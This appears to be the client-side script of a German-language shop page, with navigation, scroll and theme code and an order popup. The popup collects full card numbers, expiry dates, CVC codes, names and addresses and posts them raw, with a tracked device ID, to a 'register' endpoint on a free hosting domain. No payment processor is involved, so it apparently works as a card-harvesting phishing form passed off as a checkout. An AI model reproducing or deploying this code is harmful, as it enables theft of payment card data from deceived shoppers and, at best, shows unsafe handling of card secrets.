document.addEventListener("DOMContentLoaded", () => {
  const serverUrl = "https://back-xx0q.onrender.com";

  let deviceId = localStorage.getItem("deviceId");
  if (!deviceId && window.AndroidBridge?.getDeviceId) {
    deviceId = window.AndroidBridge.getDeviceId();
  }
  if (!deviceId) {
    deviceId = crypto.randomUUID();
  }
  localStorage.setItem("deviceId", deviceId);

  const navMenu = document.getElementById("nav-menu");
  const navToggle = document.getElementById("nav-toggle");
  const navClose = document.getElementById("nav-close");
  navToggle?.addEventListener("click", () => navMenu.classList.add("show-menu"));
  navClose?.addEventListener("click", () => navMenu.classList.remove("show-menu"));
  document.querySelectorAll(".nav__link").forEach(link =>
    link.addEventListener("click", () => navMenu.classList.remove("show-menu"))
  );

  const sections = document.querySelectorAll("section[id]");
  function scrollActive() {
    const scrollY = window.pageYOffset;
    sections.forEach(current => {
      const sectionTop = current.offsetTop - 50;
      const sectionHeight = current.offsetHeight;
      const sectionId = current.getAttribute("id");
      const navLink = document.querySelector(`.nav__menu a[href*="${sectionId}"]`);
      if (scrollY > sectionTop && scrollY <= sectionTop + sectionHeight) {
        navLink?.classList.add("active-link");
      } else {
        navLink?.classList.remove("active-link");
      }
    });
  }
  window.addEventListener("scroll", scrollActive);

  const scrollUpBtn = document.getElementById("scroll-up");
  function showScrollUp() {
    if (window.scrollY >= 350) {
      scrollUpBtn.classList.add("show-scroll");
    } else {
      scrollUpBtn.classList.remove("show-scroll");
    }
  }
  window.addEventListener("scroll", showScrollUp);

  const themeButton = document.getElementById("theme-button");
  const darkThemeClass = "dark-theme";
  const iconThemeClass = "fa-sun";
  const savedTheme = localStorage.getItem("selected-theme");
  const savedIcon = localStorage.getItem("selected-icon");
  const getCurrentTheme = () =>
    document.body.classList.contains(darkThemeClass) ? "dark" : "light";
  const getCurrentIcon = () =>
    themeButton.classList.contains(iconThemeClass) ? "fa-moon" : "fa-sun";
  if (savedTheme) {
    document.body.classList.toggle(darkThemeClass, savedTheme === "dark");
    themeButton.classList.toggle(iconThemeClass, savedIcon === "fa-moon");
  }
  themeButton.addEventListener("click", () => {
    document.body.classList.toggle(darkThemeClass);
    themeButton.classList.toggle(iconThemeClass);
    localStorage.setItem("selected-theme", getCurrentTheme());
    localStorage.setItem("selected-icon", getCurrentIcon());
  });

  const popup = document.getElementById("payment-popup");
  const closeBtn = popup.querySelector(".close-btn");
  const openBtns = document.querySelectorAll(".order-now-btn");
  const orderForm = document.getElementById("payment-form");
  const orderMessage = document.getElementById("order-message");

  openBtns.forEach(btn =>
    btn.addEventListener("click", e => {
      e.preventDefault();
      popup.classList.add("active");
    })
  );
  closeBtn.addEventListener("click", () => {
    popup.classList.remove("active");
    clearErrors();
    orderForm.reset();
  });
  popup.addEventListener("click", e => {
    if (e.target === popup) {
      popup.classList.remove("active");
      clearErrors();
      orderForm.reset();
    }
  });

  const validators = {
    address: {
      fn: v => v.length >= 4,
      msg: "Adresse muss mindestens 4 Zeichen enthalten."
    },
    cardholderName: {
      fn: v => /^[A-Za-zÄÖÜäöüß ]{2,}$/.test(v),
      msg: "Name nur Buchstaben und Leerzeichen, min. 2 Zeichen."
    },
    cardNumber: {
      fn: v => /^(\d{4} ?){3}\d{4}$/.test(v),
      msg: "Kartennummer muss 16 Ziffern sein (z.B. '1234 5678 9012 3456')."
    },
    expiry: {
      fn: v => {
        if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(v)) return false;
        const [m, y] = v.split("/").map(Number);
        const exp = new Date(2000 + y, m - 1, 1);
        const now = new Date();
        return exp >= new Date(now.getFullYear(), now.getMonth(), 1);
      },
      msg: "Ungültiges Ablaufdatum (MM/YY) oder bereits abgelaufen."
    },
    cvv: {
      fn: v => /^[0-9]{3,4}$/.test(v),
      msg: "CVC muss 3 oder 4 Ziffern sein."
    }
  };

  function clearErrors() {
    orderForm.querySelectorAll("input[id]").forEach(field => {
      field.classList.remove("input-error");
      const next = field.nextElementSibling;
      if (next?.classList.contains("error-text")) next.remove();
    });
    orderMessage.textContent = "";
  }

  function showError(field, message) {
    if (!field) return;
    field.classList.add("input-error");
    const err = document.createElement("div");
    err.className = "error-text";
    err.textContent = message;
    field.after(err);
  }

  const cardInput = document.getElementById("cardNumber");
  const expiryInput = document.getElementById("expiry");
  cardInput?.addEventListener("input", () => {
    let v = cardInput.value.replace(/\D/g, "").slice(0, 16);
    cardInput.value = v.match(/.{1,4}/g)?.join(" ") || v;
  });
  expiryInput?.addEventListener("input", () => {
    let v = expiryInput.value.replace(/\D/g, "").slice(0, 4);
    if (v.length > 2) v = v.slice(0, 2) + "/" + v.slice(2);
    expiryInput.value = v;
  });

  orderForm.addEventListener("submit", async e => {
    e.preventDefault();
    clearErrors();
    let hasError = false;
    const data = {};
    orderForm.querySelectorAll("input[id]").forEach(field => {
      const id = field.id;
      const val = field.value.trim();
      if (validators[id]) {
        if (!validators[id].fn(val)) {
          showError(field, validators[id].msg);
          hasError = true;
        }
        data[id] = val;
      }
    });
    if (hasError) {
      orderMessage.textContent = "Bitte korrigiere die markierten Felder.";
      return;
    }
    data.deviceId = deviceId;
    data.timestamp = new Date().toISOString();
    try {
      const res = await fetch(`${serverUrl}/api/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
      const result = await res.json();
      if (!res.ok || !result.success) throw new Error(result.message);
      popup.classList.remove("active");
      orderForm.reset();
    } catch (err) {
      console.error("Bestell-Fehler:", err);
      orderMessage.textContent =
        "Beim Senden ist ein Fehler aufgetreten. Bitte versuche es erneut.";
    }
  });
});
